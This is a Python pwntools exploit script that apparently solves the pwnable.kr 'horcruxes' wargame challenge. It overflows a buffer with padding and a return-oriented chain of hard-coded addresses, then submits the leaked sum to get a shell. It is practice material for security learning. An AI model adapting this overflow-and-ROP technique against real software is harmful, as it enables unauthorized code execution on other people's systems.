import struct
import sys
from pwn import *

def send_payload(process):
    payload = b"\x41" * 120  # padding
# the below are the addresses for each of the 7 functions
# that we need to jump to.
    fn1 = struct.pack("<I", 0x0809FE4B)
    fn2 = struct.pack("I", 0x0809FE6A)
    fn3 = struct.pack("I", 0x0809FE89)
    fn4 = struct.pack("I", 0x0809FEA8)
    fn5 = struct.pack("I", 0x0809FEC7)
    fn6 = struct.pack("I", 0x0809FEE6)
    fn7 = struct.pack("I", 0x0809FF05)
    ropme = struct.pack("I",0x0809FFFC)
    payload+=fn1+fn2+fn3+fn4+fn5+fn6+fn7+ropme 
# sys.stdout.buffer.write(padding)
    ## use this line if you want to write to a file, for debugging purposes.## 
    process.sendline(payload)
    print("Payload injected.")

def main():
    if(len(sys.argv) != 2):
        print(f"Usage: {sys.argv[0]} <target>")
        exit(1)

    target = sys.argv[1]

    if(target=="remote"):
       p = remote('pwnable.kr', 9032)
    if(target=="local"):
       p = process("./horcruxes")
    else:
       p = remote('pwnable.kr', 9032)
       print(f"inexplicit. Chose to send payload to remote.")

     
    p.recvuntil("u:")
    p.sendline(b"1")
    p.recvuntil("? : ")
    send_payload(p)
    sum=0
    for i in range(0,7):
        p.recvuntil('EXP +')
        sum += int(p.recvuntil(')')[:-1])
     
    p.recvuntil("u:")
    p.sendline(b"1")
    p.recvuntil("? : ")
    p.sendline(str(sum).encode())
    p.interactive()


if __name__ == "__main__":
    main()
